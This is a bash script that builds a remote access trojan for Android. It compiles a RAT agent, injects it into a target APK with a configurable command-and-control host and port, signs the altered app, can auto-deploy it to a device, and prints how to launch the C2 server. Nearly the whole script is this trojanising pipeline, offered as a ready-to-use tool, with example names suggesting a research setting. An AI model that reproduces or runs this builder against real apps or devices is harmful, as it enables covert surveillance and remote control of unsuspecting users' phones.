#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

usage() {
    cat <<EOF
Usage: $0 <target.apk> [options]

Build a RAT APK from a target APK. This script:
  1. Builds the Java agent (if not already built)
  2. Instruments the target APK with the RAT agent
  3. Signs the resulting APK

Options:
  --c2-host HOST    C2 server host (default: 127.0.0.1)
  --c2-port PORT    C2 server port (default: 8080)
  --output DIR      Output directory (default: ./output)
  --skip-agent      Skip agent build (use existing compiled agent)
  --serial SERIAL   Device serial for auto-deploy after build
  -v, --verbose     Verbose output
  -h, --help        Show this help

Examples:
  $0 research-app.apk
  $0 research-app.apk --c2-host 192.168.1.100 --c2-port 9000
  $0 research-app.apk --serial emulator-5554 --verbose
EOF
    exit 0
}

TARGET_APK=""
C2_HOST="127.0.0.1"
C2_PORT=8080
OUTPUT_DIR="./output"
SKIP_AGENT=false
SERIAL=""
VERBOSE=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --c2-host) C2_HOST="$2"; shift 2 ;;
        --c2-port) C2_PORT="$2"; shift 2 ;;
        --output) OUTPUT_DIR="$2"; shift 2 ;;
        --skip-agent) SKIP_AGENT=true; shift ;;
        --serial) SERIAL="$2"; shift 2 ;;
        -v|--verbose) VERBOSE="-v"; shift ;;
        -h|--help) usage ;;
        -*) echo "Unknown option: $1"; usage ;;
        *)
            if [[ -z "$TARGET_APK" ]]; then
                TARGET_APK="$1"
            else
                echo "Error: unexpected argument '$1'"
                usage
            fi
            shift ;;
    esac
done

if [[ -z "$TARGET_APK" ]]; then
    echo "Error: no target APK specified"
    usage
fi

if [[ ! -f "$TARGET_APK" ]]; then
    echo "Error: APK not found: $TARGET_APK"
    exit 1
fi

echo "========================================="
echo "  RAT APK Builder"
echo "========================================="
echo "  Target: $TARGET_APK"
echo "  C2:     $C2_HOST:$C2_PORT"
echo "  Output: $OUTPUT_DIR"
echo "========================================="
echo ""

# Step 1: Build agent
if [[ "$SKIP_AGENT" == "false" ]]; then
    echo "[Step 1/3] Building RAT agent..."
    bash "$SCRIPT_DIR/agent/build.sh"
    echo ""
else
    echo "[Step 1/3] Skipping agent build (--skip-agent)"
    if [[ ! -d "$SCRIPT_DIR/agent/smali" ]] && [[ ! -f "$SCRIPT_DIR/agent/build/classes.dex" ]]; then
        echo "  Warning: no compiled agent found. Run without --skip-agent first."
        echo "  Falling back to generated smali bootstrap."
    fi
    echo ""
fi

# Step 2: Instrument APK
echo "[Step 2/3] Instrumenting APK..."
python3 "$SCRIPT_DIR/instrument.py" "$TARGET_APK" \
    --rat \
    --c2-host "$C2_HOST" \
    --c2-port "$C2_PORT" \
    -o "$OUTPUT_DIR" \
    $VERBOSE
echo ""

# Step 3: Find output APK
SIGNED_APK=$(find "$OUTPUT_DIR" -name "instrumented-*$(basename "$TARGET_APK")" -type f 2>/dev/null | head -1)
if [[ -z "$SIGNED_APK" ]]; then
    SIGNED_APK=$(find "$OUTPUT_DIR" -name "instrumented-*.apk" -type f -newer "$TARGET_APK" 2>/dev/null | head -1)
fi

if [[ -z "$SIGNED_APK" ]]; then
    echo "Error: could not find instrumented APK in $OUTPUT_DIR"
    exit 1
fi

echo "[Step 3/3] Build complete!"
echo ""
echo "========================================="
echo "  Output: $SIGNED_APK"
echo "========================================="
echo ""
echo "To deploy to a connected device:"
echo "  $SCRIPT_DIR/deploy_apk.sh $SIGNED_APK"
if [[ -n "$SERIAL" ]]; then
    echo ""
    echo "Auto-deploying to $SERIAL..."
    bash "$SCRIPT_DIR/deploy_apk.sh" "$SIGNED_APK" --serial "$SERIAL"
fi
echo ""
echo "To start the C2 server:"
echo "  python3 $SCRIPT_DIR/c2_server.py --port $C2_PORT"
